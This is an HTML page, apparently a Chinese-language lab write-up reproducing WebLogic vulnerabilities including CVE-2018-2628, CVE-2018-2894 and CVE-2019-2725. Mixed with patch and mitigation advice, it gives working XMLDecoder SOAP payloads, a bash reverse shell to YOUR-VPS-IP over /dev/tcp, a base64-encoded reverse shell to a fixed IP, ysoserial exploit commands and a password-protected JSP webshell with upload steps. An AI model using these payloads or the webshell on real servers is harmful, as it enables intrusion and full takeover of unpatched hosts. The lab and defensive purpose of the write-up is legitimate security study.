+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171555437.png" data-fancybox="true"/></div></div>
+<h4 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><p>步骤和上方一样,将payload换为写shell的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br><span class="line">            &lt;java version=<span class="string">&quot;1.4.0&quot;</span> class=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="line">                &lt;void class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="line">                    &lt;array class=<span class="string">&quot;java.lang.String&quot;</span> length=<span class="string">&quot;3&quot;</span>&gt;</span><br><span class="line">                        &lt;void index=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">                            &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">                        &lt;/void&gt;</span><br><span class="line">                        &lt;void index=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">                            &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                        &lt;/void&gt;</span><br><span class="line">                        &lt;void index=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">                            &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/YOUR-VPS-IP/6666 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">                        &lt;/void&gt; </span><br><span class="line">                    &lt;/array&gt;</span><br><span class="line">                    &lt;void method=<span class="string">&quot;start&quot;</span>/&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">            &lt;/java&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171558519.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171605805.png" data-fancybox="true"/></div></div>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li><p>临时解决方案 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口,若Weblogic服务器集群中未应用此组件,建议临时备份后将此组件删除,当形成防护能力后,再进行恢复</span></span><br><span class="line"><span class="comment"># 根据实际环境路径,删除WebLogic wls-wsat组件:</span></span><br><span class="line"><span class="built_in">rm</span> -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</span><br><span class="line"><span class="built_in">rm</span> -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</span><br><span class="line"><span class="built_in">rm</span> -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat</span><br><span class="line"><span class="comment"># 重启Weblogic域控制器服务</span></span><br><span class="line"><span class="comment"># 停止服务</span></span><br><span class="line">DOMAIN_NAME/bin/stopWeblogic.sh</span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">DOMAIN_NAME/bin/startManagedWebLogic.sh</span><br><span class="line"><span class="comment"># 删除以上文件之后,需重启WebLogic</span></span><br><span class="line">确认http://weblogic_ip/wls-wsat/ 是否为404页面.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>官方补丁修复前往Oracle官网下载10月份所提供的安全补丁<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon"><div class="left"><span class="title">http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html</span><span class="cap link footnote">http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div></div></a></div></p>
+</li>
+</ol>
+<h2 id="WLS-Core-Components-反序列化命令执行漏洞-CVE-2018-2628"><a href="#WLS-Core-Components-反序列化命令执行漏洞-CVE-2018-2628" class="headerlink" title="WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628)"></a>WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628)</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序(客户端或者其它Weblogic Server实例)之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机(JVM)中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本:"></a>影响版本:</h3><ul>
+<li>Oracle Weblogic Server10.3.6.0.0 </li>
+<li>Oracle Weblogic Server12.1.3.0.0 </li>
+<li>Oracle Weblogic Server12.2.1.2.0 </li>
+<li>Oracle Weblogic Server12.2.1.3.0</li>
+</ul>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞探测-1"><a href="#漏洞探测-1" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><ol>
+<li><p>使用namp查看目标主机是否启用T3协议 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7001 -T4 -A -v --script weblogic-t3-info 192.168.2.188</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171851880.png" data-fancybox="true"/></div></div>
+</li>
+<li><p>启动JRMP Server(监听1099)</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/ysoserial-0.0.6-SNAPSHOT-all.jar" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon"><div class="left"><span class="title">https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/ysoserial-0.0.6-SNAPSHOT-all.jar</span><span class="cap link footnote">https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/ysoserial-0.0.6-SNAPSHOT-all.jar</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div></div></a></div>
+<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;ping 0qie8z.dnslog.cn&#39;</code>	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171807650.png" data-fancybox="true"/></div></div></p>
+</li>
+<li><p>执行脚本</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/CVE-2018-2628.py" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon"><div class="left"><span class="title">https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/CVE-2018-2628.py</span><span class="cap link footnote">https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/CVE-2018-2628.py</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div></div></a></div>
+<p><code>python2 CVE-2018-2628.py 192.168.2.188 7001 ysoserial-0.0.6-SNAPSHOT-all.jar 192.168.2.107 1099 JRMPClient</code><br>192.168.2.188:目标IP<br>192.168.2.107:刚刚开启监听1099端口的主机IP	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171848106.png" data-fancybox="true"/></div></div><br>查看监听状态</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171849466.png" data-fancybox="true"/></div></div> </li>
+<li><p>验证漏洞是否成功	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171848836.png" data-fancybox="true"/></div></div></p>
+</li>
+</ol>
+<h4 id="反弹Shell-1"><a href="#反弹Shell-1" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><p>步骤和上面一样,只需将ping更换为base64后的payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp;  /dev/tcp/192.168.43.220/1234 0&gt;&amp;1</span><br><span class="line"><span class="comment"># 进行base64编码</span></span><br><span class="line"><span class="comment"># 一会儿要用到base64编码后的shell,命令如下:</span></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzE5Mi4xNjguNDMuMjIwLzEyMzQgMD4mMQ==&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-I&#125;</span><br><span class="line"><span class="comment"># 可以使用下面地址进行base64:</span></span><br><span class="line"><span class="comment"># https://ares-x.com/tools/runtime-exec/</span></span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171855879.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171906916.png" data-fancybox="true"/></div></div>
+<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>此漏洞产生于Weblogic T3服务,当开放Weblogic控制台端口(默认为7001端口)时,T3服务会默认开启.关闭T3服务,或控制T3服务的访问权限,能防护该漏洞.对于不在Oracle官方支持范围内的版本,由于没有最新补丁,推荐采用此种方式进行修复.同时,Weblogic采用黑名单的方式进行反序列化漏洞的修复,存在被绕过的风险,因此控制T3服务为防护Weblogic RMI这类反序列化漏洞的有效方式.控制T3服务方式: </li>
+<li>进入Weblogic控制台,在base_domain的配置页面中,进入”安全”选项卡页面,点击”筛选器”,进入连接筛选器配置.</li>
+<li>在连接筛选器中输入:weblogic.security.net.ConnectionFilterImpl,在连接筛选器规则中输入:<code>127.0.0.1 allow t3 t3s,0.0.0.0/0 deny t3 t3s</code>(t3和t3s协议的所有端口只允许本地访问).</li>
+<li>保存后需重新启动,规则方可生效.</li>
+<li>更新Oracle官方发布的最新补丁,同时升级jdk至1.7.0.21以上版本. </li>
+<li>如以上两种策略都无法采用,则可以考虑用更改代码的方式.以10.3.6.0为例,在<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>的黑名单<code>DEFAULT_BLACKLIST_CLASS</code>中添加<code>java.rmi.server.RemoteObjectInvocationHandler</code>,编译并更新swlclient.jar、wlthint3client.jar这两个用到该类的包</li>
+</ol>
+<h2 id="任意文件上传漏洞-CVE-2018-2894"><a href="#任意文件上传漏洞-CVE-2018-2894" class="headerlink" title="任意文件上传漏洞(CVE-2018-2894)"></a>任意文件上传漏洞(CVE-2018-2894)</h2><h3 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Oracle Fusion Middleware(Oracle融合中间件)是美国甲骨文(Oracle)公司的一套面向企业和云环境的业务创新平台.该平台提供了中间件、软件集合等功能.Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件. WebLogic管理端未授权的两个页面存在任意上传getshell漏洞,可直接获取权限.两个页面分别为<code>/ws_utc/begin.do</code>,<code>/ws_utc/config.do</code></p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li><p>访问漏洞位置<a target="_blank" rel="noopener" href="http://192.168.2.188:7004/ws_utc/config.do">http://192.168.2.188:7004/ws_utc/config.do</a> </p>
+</li>
+<li><p>获取账号密码<code>docker-compose logs | grep password</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171923808.png" data-fancybox="true"/></div></div></li>
+<li><p>访问<code>http://192.168.2.188:7001/console/login/LoginForm.jsp</code>登录后台管理员用户名为<code>weblogic</code> </p>
+</li>
+<li><p>点击<code>base_domain</code>的配置,在”高级”中开启”启用 Web 服务测试页”选项	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171934003.png" data-fancybox="true"/></div></div></p>
+</li>
+<li><p>访问<code>http://192.168.44.132:7001/ws_utc/config.do</code> </p>
+</li>
+<li><p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>静态文件css目录,访问这个目录是无需权限的</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171937238.png" data-fancybox="true"/></div></div></li>
+<li><p>构造webshell </p>
+</li>
+<li><p>创建a.jsp内容如下请求:<code>http://x.x.x.x/a.jsp?pwd=023&amp;i=whoami</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream(); <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>]; out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>); <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b)); &#125; out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>); &#125; %&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后点击Security-&gt; Add,<strong>抓包</strong>,然后上传webshell因为weblogic使用了时间戳_文件名进行了重命名,时间戳在返回包中</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171942467.png" data-fancybox="true"/></div></div>	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171942358.png" data-fancybox="true"/></div></div></li>
+<li><p>然后访问<code>http://192.168.2.188:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>,即可执行webshell	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171945217.png" data-fancybox="true"/></div></div></p>
+</li>
+</ol>
+<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>暂无</p>
+<h2 id="未授权RCE-CVE-2019-2725"><a href="#未授权RCE-CVE-2019-2725" class="headerlink" title="未授权RCE(CVE-2019-2725)"></a>未授权RCE(CVE-2019-2725)</h2><h3 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞,这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞,通过针对Oracle官网历年来的补丁构造payload来绕过.</p>
+<ul>
+<li>影响版本:weblogic 10.x、weblogic 12.1.3 </li>
+<li>存在&#x2F;_async&#x2F;AsyncResponseService接口</li>
+</ul>
+<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li>访问<code>/_async/AsyncResponseService</code>接口,存在如下页面,即存在漏洞	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210082238333.png" data-fancybox="true"/></div></div></li>
+<li>attck-命令执行 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> xmlns:wsa=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span><br><span class="line">xmlns:asy=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br><span class="line">&lt;void class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="line">&lt;array class=<span class="string">&quot;java.lang.String&quot;</span> length=<span class="string">&quot;3&quot;</span>&gt;</span><br><span class="line">&lt;void index=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">&lt;string&gt;ping tdjmtv.dnslog.cn&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=<span class="string">&quot;start&quot;</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180851491.png" data-fancybox="true"/></div></div></li>
+</ol>
+<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>升级本地JDK环境 </li>
+<li>及时安装官方补丁</li>
+</ul>
+<h2 id="未认证远程命令执行-CVE-2020-14882、CVE-2020-14883"><a href="#未认证远程命令执行-CVE-2020-14882、CVE-2020-14883" class="headerlink" title="未认证远程命令执行(CVE-2020-14882、CVE-2020-14883)"></a>未认证远程命令执行(CVE-2020-14882、CVE-2020-14883)</h2><h3 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Oracle WebLogic Server 是行业领先的应用服务器,用于使用 Java EE 标准构建企业应用程序,并将它们部署在可靠、可扩展的运行时上,并且拥有成本低.</p>
+<p>在<a target="_blank" rel="noopener" href="https://www.oracle.com/security-alerts/cpuoct2020traditional.html">Oracle 重要补丁更新公告 - 2020 年 10 月中</a>,Oracle 修复了 CVE-2020-14882 和 CVE-2020-14883 来自 Chaitin Tech 的安全研究员 <a href="/Voidfyoo">@Voidfyoo </a> 提交的两个安全漏洞. </p>
+<p>CVE-2020-14882 允许远程用户绕过管理员控制台组件中的身份验证,CVE-2020-14883  允许经过身份验证的用户在管理员控制台组件上执行任何命令.使用这两个漏洞链,未经身份验证的远程攻击者可以通过 HTTP 在 Oracle  WebLogic 服务器上执行任意命令并完全控制主机.</p>
+<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
